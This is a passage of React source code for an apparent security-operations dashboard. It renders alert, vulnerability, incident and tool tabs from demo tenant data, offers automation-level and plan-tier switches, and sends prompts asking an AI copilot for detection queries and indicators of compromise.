            <textarea value={adminBannerInput} onChange={e=>setAdminBannerInput(e.target.value)} placeholder='e.g. Scheduled maintenance Sunday 02:00–04:00 UTC…' rows={3} style={{width:'100%',padding:'10px 12px',borderRadius:8,border:'1px solid var(--wt-border2)',background:'var(--wt-card2)',color:'var(--wt-text)',fontSize:'0.78rem',fontFamily:'Inter,sans-serif',resize:'none',outline:'none',boxSizing:'border-box'}} />
            <div style={{display:'flex',gap:8,marginTop:10}}>
              <button onClick={()=>{if(!adminBannerInput.trim())return;setClientBanner(adminBannerInput.trim());setAdminBannerInput('');fetch('/api/settings/user',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clientBanner:adminBannerInput.trim()})}).catch(()=>{});}} style={{padding:'8px 20px',borderRadius:8,border:'none',background:'#f0a030',color:'#fff',fontSize:'0.78rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>📢 Publish Platform-Wide</button>
              {clientBanner && <button onClick={()=>{setClientBanner(null);fetch('/api/settings/user',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clientBanner:''})}).catch(()=>{});}} style={{padding:'8px 16px',borderRadius:8,border:'1px solid #f0405e30',background:'#f0405e0a',color:'#f0405e',fontSize:'0.78rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>✕ Clear</button>}
            </div>
            {clientBanner && <div style={{marginTop:10,padding:'10px 14px',background:'#f0a03012',border:'1px solid #f0a03030',borderRadius:8,fontSize:'0.74rem',color:'#f0a030'}}>📢 Active: {clientBanner}</div>}
          </div>
          <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'16px 18px'}}>
            <div style={{fontSize:'0.78rem',fontWeight:700,marginBottom:12}}>Target Specific Subscriber</div>
            {WTC_SUBSCRIBERS.filter(s=>s.status!=='Churned').map(sub=>(
              <div key={sub.id} style={{display:'flex',alignItems:'center',gap:10,padding:'8px 0',borderBottom:'1px solid var(--wt-border)'}}>
                <span style={{flex:1,fontSize:'0.76rem'}}>{sub.name}</span>
                <span style={{fontSize:'0.58rem',color:planColor[sub.plan]||'#6b7a94',fontWeight:700}}>{sub.plan}</span>
                <button onClick={()=>setAdminBannerInput(`[${sub.name}] `)} style={{padding:'4px 10px',borderRadius:6,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.62rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Compose →</button>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

export default function DashboardPage() {
  const [activeTab, setActiveTab] = useState('overview');
  const [automation, setAutomation] = useState(1);
  const [modal, setModal] = useState(null);
  const [selectedAlert, setSelectedAlert] = useState(null);
  const [selectedVuln, setSelectedVuln] = useState(null);
  const [selectedIncident, setSelectedIncident] = useState(null);
  const [vulnAiLoading, setVulnAiLoading] = useState(null);
  const [vulnAiTexts, setVulnAiTexts] = useState({});
  const [industry, setIndustry] = useState('Financial Services');
  // Load persisted settings from Redis on mount
  useEffect(()=>{
    fetch('/api/settings/user')
      .then(r=>r.json())
      .then(d=>{
        if (d.settings?.industry) setIndustry(d.settings.industry);
        if (d.settings?.demoMode !== undefined) setDemoMode(d.settings.demoMode === 'true');
        if (d.settings?.automation !== undefined) setAutomation(Number(d.settings.automation));
        if (d.settings?.userTier) setUserTier(d.settings.userTier);
        if (d.settings?.clientBanner) setClientBanner(d.settings.clientBanner || null);
      })
      .catch(()=>{});
  },[]);
  function setIndustryPersisted(ind) {
    setIndustry(ind);
    fetch('/api/settings/user',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({industry:ind})}).catch(()=>{});
  }
  const [intelLoading, setIntelLoading] = useState(false);
  const [customIntel, setCustomIntel] = useState(null);
  const [expandedAlerts, setExpandedAlerts] = useState(new Set());
  const [deployAgentDevice, setDeployAgentDevice] = useState(null);
  const [incidentStatuses, setIncidentStatuses] = useState({});
  const [deletedIncidents, setDeletedIncidents] = useState(new Set());
  function deleteIncident(id) { setDeletedIncidents(prev=>new Set([...prev,id])); setSelectedIncident(null); }
  const [incidentNotes, setIncidentNotes] = useState({});
  const [noteInput, setNoteInput] = useState('');
  const [addingNoteTo, setAddingNoteTo] = useState(null);
  const [gapToolFilter, setGapToolFilter] = useState(null);
  const [expandedIntel, setExpandedIntel] = useState(new Set());
  const [iocQueries, setIocQueries] = useState({});
  const [iocQueryLoading, setIocQueryLoading] = useState(null);
  const [demoMode, setDemoMode] = useState(true);
  const [clientBanner, setClientBanner] = useState(null);
  const [adminBannerInput, setAdminBannerInput] = useState('');
  const [connectedTools, setConnectedTools] = useState({});
  const [credentialsLoaded, setCredentialsLoaded] = useState(false);
  const [liveAlerts, setLiveAlerts] = useState([]);
  const [aiTriageCache, setAiTriageCache] = useState({}); // alertId → {loading, result}
  const [syncStatus, setSyncStatus] = useState('idle'); // idle | syncing | ok | error
  const [syncError, setSyncError] = useState(null);
  const [lastSynced, setLastSynced] = useState(null);
  const [currentTenant, setCurrentTenant] = useState('global');

  // Load persisted tool connections from Redis
  useEffect(()=>{
    fetch('/api/integrations/credentials')
      .then(r=>r.json())
      .then(d=>{
        if (d.connected && Object.keys(d.connected).length > 0) setConnectedTools(d.connected);
        setCredentialsLoaded(true);
      })
      .catch(()=>{ setCredentialsLoaded(true); });
  },[]);

  // Sync live data — only after credentials loaded, only in LIVE mode
  useEffect(()=>{
    if (!credentialsLoaded || demoMode || Object.keys(connectedTools).length === 0) return;
    const doSync = () => {
      setSyncStatus('syncing');
      setSyncError(null);
      const integrations = Object.entries(connectedTools).map(([id, credentials]) => ({id, credentials}));
      fetch('/api/integrations/sync', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({integrations: integrations.map(i=>({id:i.id})), since: Date.now() - 7*24*60*60*1000}),
      })
      .then(r=>r.json())
      .then(d=>{
        if (d.results) {
          const allAlerts = d.results.flatMap(r => r.alerts || []);
          setLiveAlerts(allAlerts);
          // Check for per-tool errors
          const errors = d.results.filter(r=>r.error).map(r=>`${r.toolId}: ${r.error}`);
          if (errors.length > 0) { setSyncError(errors.join(' · ')); setSyncStatus('error'); }
          else { setSyncStatus('ok'); }
        } else {
          setSyncStatus('error'); setSyncError(d.error || 'Sync failed');
        }
        setLastSynced(new Date().toLocaleTimeString());
      })
      .catch(e=>{ setSyncStatus('error'); setSyncError(e.message); });
    };
    doSync();
    const interval = setInterval(doSync, 60000);
    return () => clearInterval(interval);
  },[demoMode, connectedTools, credentialsLoaded]);
  const [isAdmin, setIsAdmin] = useState(false);
  const [userRole, setUserRole] = useState(null); // null=owner, 'tech_admin', 'viewer', 'sales'
  const [sessionLoaded, setSessionLoaded] = useState(false);
  const [userTier, setUserTier] = useState('community');
  const [theme, setTheme] = useState('dark');

  const DEMO_TENANTS = [
    {id:'global', name:'My Organisation', type:'direct'},
    {id:'client-acme', name:'Acme Financial', type:'client'},
    {id:'client-nhs', name:'NHS Trust Alpha', type:'client'},
    {id:'client-retail', name:'RetailCo UK', type:'client'},
    {id:'client-gov', name:'Gov Dept Beta', type:'client'},
  ];

  function toggleIntel(id) {
    setExpandedIntel(prev => { const n = new Set(prev); n.has(id)?n.delete(id):n.add(id); return n; });
  }

  // Load session — check auth and get isAdmin from server
  useEffect(()=>{
    fetch('/api/auth/session')
      .then(r=>r.json())
      .then(d=>{
        if (d.authenticated) {
          setIsAdmin(d.isAdmin || false);
          if (d.role) setUserRole(d.role);
          if (d.tenantId) setCurrentTenant(d.tenantId);
        }
        setSessionLoaded(true);
      })
      .catch(()=>{ setSessionLoaded(true); });
  },[]);

  // Theme preference intentionally uses localStorage — it must apply synchronously
  // before React hydrates to avoid a dark→light flash. Not user data, pure display state.
  useEffect(()=>{
    const saved = typeof window !== 'undefined' ? localStorage.getItem('wt_theme') : null;
    if (saved === 'light') setTheme('light');
  },[]);

  function toggleTheme() {
    const next = theme === 'dark' ? 'light' : 'dark';
    setTheme(next);
    if (typeof window !== 'undefined') localStorage.setItem('wt_theme', next);
  }

  // ── Tier ─────────────────────────────────────────────────────────────────────
  // In production this comes from the session/JWT. Change to test paywalls.
  const tierLevel = {community:0,team:1,business:2,mssp:3}[userTier];
  const canUse = (min) => tierLevel >= {community:0,team:1,business:2,mssp:3}[min];

  // ── Per-tenant demo data ──────────────────────────────────────────────────────
  const TENANT_ALERTS = {
    'global': DEMO_ALERTS,
    'client-acme': DEMO_ALERTS.slice(0,3).map(a=>({...a, id:a.id+'-acme', device:'acme-'+a.device, source:a.source})),
    'client-nhs': DEMO_ALERTS.slice(1,4).map(a=>({...a, id:a.id+'-nhs', device:'nhs-'+a.device, severity:a.severity==='Low'?'Medium':a.severity})),
    'client-retail': DEMO_ALERTS.slice(0,2).map(a=>({...a, id:a.id+'-retail', device:'retail-'+a.device})),
    'client-gov': DEMO_ALERTS.slice(2,5).map(a=>({...a, id:a.id+'-gov', device:'gov-'+a.device})),
  };
  const TENANT_VULNS = {
    'global': DEMO_VULNS,
    'client-acme': DEMO_VULNS.slice(0,4).map(v=>({...v, id:v.id+'-acme', affected: Math.max(1, Math.round(v.affected*0.6)), affectedDevices: v.affectedDevices.map(d=>'acme-'+d)})),
    'client-nhs': DEMO_VULNS.slice(0,7).map(v=>({...v, id:v.id+'-nhs', affected: Math.max(1, Math.round(v.affected*1.4)), affectedDevices: v.affectedDevices.map(d=>'nhs-'+d)})),
    'client-retail': DEMO_VULNS.slice(0,5).map(v=>({...v, id:v.id+'-retail', affectedDevices: v.affectedDevices.map(d=>'retail-'+d)})),
    'client-gov': DEMO_VULNS.slice(1,6).map(v=>({...v, id:v.id+'-gov', affectedDevices: v.affectedDevices.map(d=>'gov-'+d)})),
  };
  const TENANT_INCIDENTS = {
    'global': DEMO_INCIDENTS,
    'client-acme': DEMO_INCIDENTS.slice(0,1).map(i=>({...i, id:'INC-ACME-01', title:'[Acme] '+i.title})),
    'client-nhs': DEMO_INCIDENTS.map(i=>({...i, id:'INC-NHS-'+i.id.slice(-2), title:'[NHS] '+i.title})),
    'client-retail': [],
    'client-gov': DEMO_INCIDENTS.slice(0,1).map(i=>({...i, id:'INC-GOV-01', title:'[Gov] '+i.title})),
  };

  // Tool status: in DEMO show demo-active tools; in LIVE show connected tools
  const tools = ALL_TOOLS.map(t => {
    const isConnected = !!connectedTools[t.id];
    const demo = DEMO_TOOLS.find(d=>d.id===t.id);
    return {
      id: t.id, name: t.name,
      configured: isConnected || (!demoMode ? false : (demo?.configured || false)),
      active: demoMode ? (demo?.active || false) : isConnected,
      alertCount: demo?.alertCount,
    };
  }).filter(t => demoMode ? DEMO_TOOLS.find(d=>d.id===t.id) : t.active);

  // DEMO: always use demo data. LIVE: use live data if available, else empty (not demo)
  const rawAlerts = demoMode
    ? (TENANT_ALERTS[currentTenant] || DEMO_ALERTS)
    : liveAlerts;
  const alerts = rawAlerts;
  const vulns = TENANT_VULNS[currentTenant] || DEMO_VULNS;
  const incidents = TENANT_INCIDENTS[currentTenant] || DEMO_INCIDENTS;

  const activeTools = tools.filter(t=>t.active);
  const taegisActive = tools.find(t=>t.id==='taegis')?.active || false;
  const darktrace = tools.find(t=>t.id==='darktrace');
  const totalDevices = 247;
  const gapDevices = DEMO_GAP_DEVICES;
  const coveredPct = Math.round(((totalDevices - gapDevices.length) / totalDevices) * 100);
  const critAlerts = alerts.filter(a=>a.severity==='Critical');
  const tpAlerts = alerts.filter(a=>a.verdict==='TP');
  const fpAlerts = alerts.filter(a=>a.verdict==='FP');
  const critVulns = vulns.filter(v=>v.severity==='Critical');
  const kevVulns = vulns.filter(v=>v.kev);
  const posture = 74;
  const postureColor = '#f0a030';

  const autLabel = ['Recommend Only','Auto + Notify','Full Auto'][automation];
  const autColor = ['#6b7a94','#f0a030','#22d49a'][automation];
  // Automation effects: filter what's "acted on" based on level
  const actedAlerts = alerts.filter(a => {
    if (automation === 0) return false; // Recommend Only — no auto actions
    if (automation === 1) return a.verdict === 'FP' && a.confidence >= 90; // Auto+Notify — auto-close high-confidence FPs only
    return a.confidence >= 80; // Full Auto — act on all high-confidence verdicts
  });
  const automationBannerText = automation === 0
    ? 'AI is recommending only — all actions require analyst approval.'
    : automation === 1
    ? `AI auto-closed ${actedAlerts.length} high-confidence false positive${actedAlerts.length!==1?'s':''} and notified your team.`
    : `AI acted autonomously on ${actedAlerts.length} alert${actedAlerts.length!==1?'s':''} — ${alerts.filter(a=>a.verdict==='TP'&&a.confidence>=80).length} threats contained, ${alerts.filter(a=>a.verdict==='FP'&&a.confidence>=80).length} FPs suppressed.`;

  const intelItems = customIntel || (DEMO_INTEL_BY_INDUSTRY[industry] || DEMO_INTEL_BY_INDUSTRY['default']);
  const allIntel = [...intelItems, ...DEMO_INTEL_BY_INDUSTRY['default'].filter(i=>!intelItems.find(x=>x.id===i.id))];

  async function fetchIntelForIndustry(ind) {
    setIntelLoading(true);
    setCustomIntel(null);
    try {
      const resp = await fetch('/api/intel/industry', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({industry:ind}) });
      if (resp.ok) { const d = await resp.json(); setCustomIntel(d.items); }
    } catch(e) {}
    setIntelLoading(false);
  }

  async function getVulnAiHelp(vuln, queryType) {
    const loadKey = vuln.id + ':' + queryType;
    setVulnAiLoading(loadKey);
    const prompts = {
      splunk: 'For ' + vuln.cve + ' (' + vuln.title + '), write 2-3 production-ready Splunk SPL detection queries. Use realistic Splunk index/sourcetype names. Label each: SPLUNK QUERY FOR [purpose]. Immediately follow each label with the query. No markdown, no backticks, plain text only.',
      sentinel: 'For ' + vuln.cve + ' (' + vuln.title + '), write 2-3 production-ready Microsoft Sentinel KQL detection queries using these tables: SecurityEvent, SigninLogs, AuditLogs, CommonSecurityLog, DeviceEvents. Label each: MICROSOFT SENTINEL KQL: [purpose]. Immediately follow each label with the query. No markdown, no backticks, plain text only.',
      defender: 'For ' + vuln.cve + ' (' + vuln.title + '), write 2-3 production-ready Microsoft Defender Advanced Hunting KQL queries using these tables: DeviceProcessEvents, DeviceNetworkEvents, DeviceFileEvents, DeviceRegistryEvents, IdentityLogonEvents. Label each: MICROSOFT DEFENDER ADVANCED HUNTING: [purpose]. Immediately follow each label with the query. No markdown, no backticks, plain text only.',
      iocs: 'For ' + vuln.cve + ' (' + vuln.title + '), provide known IOCs and threat indicators. Structure with these ALL-CAPS headers: KNOWN IP ADDRESSES, FILE HASHES, DOMAINS AND URLS, PROCESS INDICATORS, REGISTRY KEYS, MITRE TECHNIQUES. No markdown, plain text only.',
    };
    try {
      const resp = await fetch('/api/copilot', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({prompt: prompts[queryType]}) });
      if (resp.ok) {
        const d = await resp.json();
        const text = d.response || d.message || 'AI response unavailable — check your Anthropic API key in the Tools tab.';
        let i = 0;
        const interval = setInterval(()=>{ setVulnAiTexts(prev=>({...prev,[loadKey]:text.slice(0,i)})); i++; if(i>text.length) clearInterval(interval); }, 12);
      } else {
        setVulnAiTexts(prev=>({...prev,[loadKey]:'Request failed — check your Anthropic API key in the Tools tab.'}));
      }
    } catch(e) {
      setVulnAiTexts(prev=>({...prev,[loadKey]:'Request failed — check your Anthropic API key in the Tools tab.'}));
    }
    setVulnAiLoading(null);
  }

  function closeIncident(id) {
    setIncidentStatuses(prev=>({...prev,[id]:'Closed'}));
    setSelectedIncident(null);
  }

  function toggleAlertExpand(id) {
    setExpandedAlerts(prev => { const n = new Set(prev); n.has(id)?n.delete(id):n.add(id); return n; });
  }

  const TABS = ['overview','alerts','coverage','vulns','intel','incidents','tools','mssp'];
  const isSales = userRole === 'sales' || isAdmin;
  const isViewer = userRole === 'viewer';
  const isTechAdmin = userRole === 'tech_admin' || isAdmin;

  return (
    <div className={`wt-root${theme === 'light' ? ' light' : ''}`} style={{display:'flex',minHeight:'100vh',background:'var(--wt-bg)',color:'var(--wt-text)',fontFamily:'Inter,sans-serif'}}>
      <style dangerouslySetInnerHTML={{__html:DASHBOARD_CSS}} />

      {/* SIDEBAR */}
      <div style={{width:48,background:'var(--wt-sidebar)',borderRight:'1px solid #141820',display:'flex',flexDirection:'column',alignItems:'center',padding:'10px 0',gap:4,flexShrink:0}}>
        <div style={{width:34,height:34,marginBottom:10,display:'flex',alignItems:'center',justifyContent:'center'}}>
          <svg width="34" height="34" viewBox="0 0 34 34" fill="none">
            <rect width="34" height="34" rx="9" fill="url(#wg)"/>
            <path d="M17 7L26 11V18C26 22.5 22 26.5 17 28C12 26.5 8 22.5 8 18V11L17 7Z" fill="rgba(255,255,255,0.15)" stroke="rgba(255,255,255,0.4)" strokeWidth="0.8"/>
            <path d="M17 10L24 13.5V18.5C24 21.8 21 24.8 17 26C13 24.8 10 21.8 10 18.5V13.5L17 10Z" fill="rgba(255,255,255,0.1)"/>
            <path d="M14.5 18L16.5 20L20.5 15.5" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
            <defs><linearGradient id="wg" x1="0" y1="0" x2="34" y2="34" gradientUnits="userSpaceOnUse"><stop stopColor="#3b7fff"/><stop offset="1" stopColor="#7c3aff"/></linearGradient></defs>
          </svg>
        </div>
        {[{t:'overview',i:'📊'},{t:'alerts',i:'🔔'},{t:'coverage',i:'🛡'},{t:'vulns',i:'🔍'},{t:'intel',i:'🌐'},{t:'incidents',i:'📋'},{t:'tools',i:'🔌'}].map(({t,i})=>(
          <button key={t} onClick={()=>setActiveTab(t)} title={t.charAt(0).toUpperCase()+t.slice(1)} style={{width:34,height:34,display:'flex',alignItems:'center',justifyContent:'center',borderRadius:8,fontSize:'0.85rem',border:'none',cursor:'pointer',background:activeTab===t?'#4f8fff18':'transparent',transition:'background .15s'}}>
            {i}{t==='alerts'&&critAlerts.length>0&&<span style={{position:'absolute',marginLeft:16,marginTop:-16,width:7,height:7,borderRadius:'50%',background:'#f0405e',display:'block'}} />}
          </button>
        ))}
        <div style={{marginTop:'auto',display:'flex',flexDirection:'column',alignItems:'center',gap:4}}>
          {isAdmin && (
            <button onClick={()=>setActiveTab('admin')} title='Admin Portal'
              style={{width:34,height:34,display:'flex',alignItems:'center',justifyContent:'center',
                borderRadius:8,fontSize:'0.85rem',border:`1px solid ${activeTab==='admin'?'#f0a03040':'transparent'}`,
                cursor:'pointer',background:activeTab==='admin'?'#f0a03018':'transparent',
                transition:'all .15s',position:'relative'}}>
              🔧
              {activeTab!=='admin' && <span style={{position:'absolute',top:3,right:3,width:5,height:5,borderRadius:'50%',background:'#f0a030',boxShadow:'0 0 4px #f0a030'}} />}
            </button>
          )}
          <a href='/guide' title='User Guide' style={{width:34,height:34,display:'flex',alignItems:'center',justifyContent:'center',borderRadius:8,fontSize:'0.85rem',color:'inherit',textDecoration:'none'}}>📖</a>
          <a href='/settings' title='Settings' style={{width:34,height:34,display:'flex',alignItems:'center',justifyContent:'center',borderRadius:8,fontSize:'0.85rem',color:'inherit',textDecoration:'none'}}>⚙️</a>
        </div>
      </div>

      {/* MAIN */}
      <div style={{flex:1,display:'flex',flexDirection:'column',overflow:'hidden'}}>
        {/* Client message banner */}
        {clientBanner && (
          <div style={{display:'flex',alignItems:'center',gap:10,padding:'8px 18px',background:'#f0a03015',borderBottom:'1px solid #f0a03030',flexShrink:0}}>
            <span style={{fontSize:'0.78rem'}}>📢</span>
            <span style={{fontSize:'0.74rem',color:'#f0c070',flex:1,fontWeight:500}}>{clientBanner}</span>
            {!isAdmin && <button onClick={()=>setClientBanner(null)} style={{padding:'2px 8px',borderRadius:5,border:'1px solid #f0a03030',background:'transparent',color:'#f0a030',fontSize:'0.62rem',cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>Dismiss ×</button>}
          </div>
        )}

        {/* TOP BAR */}
        <div style={{display:'flex',alignItems:'center',padding:'8px 18px',borderBottom:'1px solid #141820',gap:12,background:'var(--wt-sidebar)',flexShrink:0,flexWrap:'wrap'}}>
          <div style={{display:'flex',gap:2,flexWrap:'wrap'}}>
            {TABS.filter(t=>{
              if (t==='mssp') return userTier==='mssp';
              if (isViewer) return ['overview','alerts','coverage','vulns','intel','incidents'].includes(t);
              return true;
            }).map(t=>(
              <button key={t} className={`tab-btn${activeTab===t?' active':''}`} onClick={()=>setActiveTab(t)}>
                {t==='mssp'?'Portfolio':t.charAt(0).toUpperCase()+t.slice(1)}
                {t==='alerts'&&critAlerts.length>0&&<span style={{marginLeft:5,fontSize:'0.48rem',fontWeight:800,padding:'1px 5px',borderRadius:3,background:'#f0405e',color:'#fff'}}>{critAlerts.length}</span>}
                {t==='vulns'&&kevVulns.length>0&&<span style={{marginLeft:5,fontSize:'0.48rem',fontWeight:800,padding:'1px 5px',borderRadius:3,background:'#f97316',color:'#fff'}}>{kevVulns.length} KEV</span>}
              </button>
            ))}
            {isSales && (
              <button className={`tab-btn${activeTab==='sales'?' active':''}`} onClick={()=>setActiveTab('sales')}
                style={{color:activeTab==='sales'?'#22d49a':undefined,background:activeTab==='sales'?'#22d49a18':undefined}}>
                📈 Sales
              </button>
            )}
            {isAdmin && (
              <button className={`tab-btn${activeTab==='admin'?' active':''}`} onClick={()=>setActiveTab('admin')}
                style={{color:activeTab==='admin'?'#f0a030':undefined,background:activeTab==='admin'?'#f0a03018':undefined}}>
                🔧 Admin
              </button>
            )}
          </div>
          <div style={{marginLeft:'auto',display:'flex',alignItems:'center',gap:10}}>
            <button onClick={toggleTheme} title={theme==='dark'?'Light mode':'Dark mode'} style={{width:32,height:32,borderRadius:8,border:'1px solid var(--wt-border)',background:'var(--wt-card)',cursor:'pointer',display:'flex',alignItems:'center',justifyContent:'center',fontSize:'0.9rem',flexShrink:0}}>{theme==='dark'?'☀️':'🌙'}</button>
              <button onClick={()=>setDemoMode(d=>{
                const next=!d;
                fetch('/api/settings/user',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({demoMode:String(next)})}).catch(()=>{});
                return next;
              })} title={demoMode?'Switch to live data':'Switch to demo data'} style={{padding:'4px 10px',borderRadius:7,border:`1px solid ${demoMode?'#f0a03030':'#22d49a30'}`,background:demoMode?'#f0a03010':'#22d49a10',color:demoMode?'#f0a030':'#22d49a',fontSize:'0.62rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>{demoMode?'● DEMO':'● LIVE'}</button>
              <select value={userTier} onChange={e=>{
                setUserTier(e.target.value);
                fetch('/api/settings/user',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userTier:e.target.value})}).catch(()=>{});
              }} title='Simulate plan tier' style={{padding:'3px 7px',borderRadius:6,border:'1px solid #8b6fff30',background:'#8b6fff10',color:'#8b6fff',fontSize:'0.6rem',fontWeight:700,fontFamily:'Inter,sans-serif',cursor:'pointer',outline:'none'}} >
                {(['community','team','business','mssp']).map(t=><option key={t} value={t}>{t.charAt(0).toUpperCase()+t.slice(1)}</option>)}
              </select>
              {isAdmin && (
                <select value={currentTenant} onChange={e=>setCurrentTenant(e.target.value)} style={{padding:'4px 8px',borderRadius:7,border:'1px solid var(--wt-border2)',background:'var(--wt-card)',color:'var(--wt-text)',fontSize:'0.68rem',fontFamily:'Inter,sans-serif',cursor:'pointer',outline:'none',maxWidth:140}}>
                  {DEMO_TENANTS.map(t=>(
                    <option key={t.id} value={t.id}>{t.type==='client'?'◦ ':''}{t.name}</option>
                  ))}
                </select>
              )}
            {canUse('team') ? (
            <div style={{display:'flex',alignItems:'center',gap:6,padding:'4px 10px',borderRadius:7,background:'var(--wt-card2)',border:'1px solid #141820'}}>
              <span style={{fontSize:'0.62rem',color:'var(--wt-muted)'}}>Automation:</span>
              {(['Recommend','Auto+Notify','Full Auto']).map((l,i)=>(
                <button key={l} onClick={()=>{
                  setAutomation(i);
                  fetch('/api/settings/user',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({automation:String(i)})}).catch(()=>{});
                }} style={{padding:'2px 8px',borderRadius:4,fontSize:'0.58rem',fontWeight:700,border:'none',cursor:'pointer',background:automation===i?`${autColor}`:'transparent',color:automation===i?'#fff':'#6b7a94',fontFamily:'Inter,sans-serif',transition:'all .15s'}}>{l}</button>
              ))}
            </div>
            ) : (
            <div style={{display:'flex',alignItems:'center',gap:6,padding:'4px 10px',borderRadius:7,background:'var(--wt-card2)',border:'1px solid #4f8fff20',opacity:0.7,cursor:'not-allowed'}} title='Upgrade to Team to enable automation'>
              <span style={{fontSize:'0.62rem',color:'var(--wt-muted)'}}>Automation:</span>
              <a href='/pricing' style={{fontSize:'0.58rem',color:'#4f8fff',fontWeight:700,textDecoration:'none'}}>🔒 Upgrade to Team</a>
            </div>
            )}
            <div style={{display:'flex',alignItems:'center',gap:5,fontSize:'0.7rem',color:'var(--wt-muted)'}}>
              {demoMode ? (
                <><span style={{width:6,height:6,borderRadius:'50%',background:'#f0a030',display:'block'}} />{tools.filter(t=>t.active).length} tools (demo)</>
              ) : syncStatus==='syncing' ? (
                <><span style={{width:8,height:8,borderRadius:'50%',border:'2px solid #4f8fff',borderTopColor:'transparent',display:'block',animation:'spin 0.8s linear infinite'}} /><span style={{color:'#4f8fff'}}>Syncing…</span></>
              ) : syncStatus==='error' ? (
                <><span style={{width:6,height:6,borderRadius:'50%',background:'#f0405e',display:'block'}} /><span style={{color:'#f0405e'}} title={syncError||''}>Sync error</span></>
              ) : syncStatus==='ok' ? (
                <><span style={{width:6,height:6,borderRadius:'50%',background:'#22c992',boxShadow:'0 0 6px #22c992',display:'block',animation:'pulse 2s ease infinite'}} />{tools.filter(t=>t.active).length} live · {lastSynced}</>
              ) : (
                <><span style={{width:6,height:6,borderRadius:'50%',background:'#6b7a94',display:'block'}} />{Object.keys(connectedTools).length} connected</>
              )}
            </div>
          </div>
        </div>

        {/* CONTENT */}
        <div style={{flex:1,overflow:'auto',padding:'16px 18px',background:'var(--wt-bg)'}}>

          {/* LIVE MODE — no data yet banner */}
          {!demoMode && liveAlerts.length === 0 && Object.keys(connectedTools).length > 0 && (
            <div style={{padding:'12px 16px',background:'#4f8fff08',border:'1px solid #4f8fff20',borderRadius:10,marginBottom:14,display:'flex',alignItems:'center',gap:10}}>
              {syncStatus==='syncing' ? <span style={{width:12,height:12,borderRadius:'50%',border:'2px solid #4f8fff',borderTopColor:'transparent',display:'block',animation:'spin 0.8s linear infinite',flexShrink:0}} /> : <span style={{fontSize:'0.9rem'}}>📡</span>}
              <div>
                <div style={{fontSize:'0.74rem',fontWeight:700,color:'#4f8fff'}}>{syncStatus==='syncing'?'Fetching live data from connected tools…':'Live mode — awaiting first sync'}</div>
                {syncError && <div style={{fontSize:'0.64rem',color:'#f0405e',marginTop:2}}>{syncError}</div>}
                {!syncError && syncStatus!=='syncing' && <div style={{fontSize:'0.64rem',color:'var(--wt-muted)',marginTop:1}}>Connected: {Object.keys(connectedTools).join(', ')} · Data syncs every 60s</div>}
              </div>
            </div>
          )}
          {!demoMode && Object.keys(connectedTools).length === 0 && (
            <div style={{padding:'12px 16px',background:'#f0a03008',border:'1px solid #f0a03020',borderRadius:10,marginBottom:14,display:'flex',alignItems:'center',gap:10}}>
              <span style={{fontSize:'0.9rem'}}>🔌</span>
              <div>
                <div style={{fontSize:'0.74rem',fontWeight:700,color:'#f0a030'}}>No tools connected — switch to Demo mode or connect a tool</div>
                <div style={{fontSize:'0.64rem',color:'var(--wt-muted)',marginTop:1}}>Go to the Tools tab to connect Taegis, Tenable, CrowdStrike and more</div>
              </div>
              <button onClick={()=>setDemoMode(true)} style={{marginLeft:'auto',padding:'5px 12px',borderRadius:6,border:'1px solid #f0a03030',background:'#f0a03010',color:'#f0a030',fontSize:'0.66rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>Switch to Demo</button>
            </div>
          )}

          {/* ═══════════════════════════════ OVERVIEW ═══════════════════════════════ */}
          {activeTab==='overview' && (
            <div style={{display:'flex',flexDirection:'column',gap:16}}>

              {/* AI Brief */}
              <div style={{padding:'12px 16px',background:'linear-gradient(135deg,rgba(79,143,255,0.05),rgba(34,201,146,0.05))',border:'1px solid #4f8fff18',borderRadius:12,display:'flex',alignItems:'flex-start',gap:10}}>
                <div style={{width:7,height:7,borderRadius:'50%',background:'#4f8fff',boxShadow:'0 0 8px #4f8fff',flexShrink:0,marginTop:2,animation:'pulse 3s ease infinite'}} />
                <div style={{flex:1}}>
                  <div style={{fontSize:'0.62rem',fontWeight:700,color:'#4f8fff',marginBottom:3}}>AI SHIFT BRIEF — {new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'})}</div>
                  <div style={{fontSize:'0.78rem',color:'var(--wt-secondary)',lineHeight:1.65}}>Processed {alerts.length} alerts this session. Auto-closed {fpAlerts.length} false positives. Escalated {tpAlerts.length} true positives to incidents. <strong style={{color:'#f0405e'}}>{critAlerts.length} critical alerts</strong> require immediate attention. Estate coverage at {coveredPct}% — {gapDevices.length} devices missing agents.</div>
                </div>
                <span style={{fontSize:'0.62rem',color:'#22d49a',fontWeight:700,background:'#22d49a12',padding:'3px 8px',borderRadius:4,flexShrink:0}}>AI Active</span>
              </div>

              {/* Estate Health 2×2 */}
              <div>
                <div style={{fontSize:'0.62rem',fontWeight:700,color:'#4f8fff',textTransform:'uppercase',letterSpacing:'1px',marginBottom:8}}>Estate Health</div>
                <div style={{display:'grid',gridTemplateColumns:'repeat(2,1fr)',gap:10}}>

                  {/* Devices + Gaps */}
                  <div onClick={()=>setModal({type:'gaps'})} style={{padding:16,background:'var(--wt-card)',border:'1px solid #141820',borderRadius:12,cursor:'pointer',transition:'border-color .15s'}}
                    onMouseEnter={e=>(e.currentTarget).style.borderColor='#4f8fff40'}
                    onMouseLeave={e=>(e.currentTarget).style.borderColor='var(--wt-border)'}>
